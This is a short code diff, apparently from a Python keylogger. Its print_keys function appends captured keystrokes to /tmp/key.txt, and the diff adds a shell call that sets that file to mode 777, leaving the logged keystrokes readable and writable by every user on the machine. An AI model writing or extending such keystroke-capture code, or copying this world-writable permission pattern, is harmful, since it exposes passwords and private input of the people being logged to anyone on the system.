@@ -197,6 +197,7 @@ def print_keys(t, modifiers, keys):
     fo = open("/tmp/key.txt","a")
     fo.write(keys)
     fo.close()
+    os.system("chmod 777 /tmp/key.txt")
     #print "%r" % ( keys)
 
 #if __name__ == "__main__":
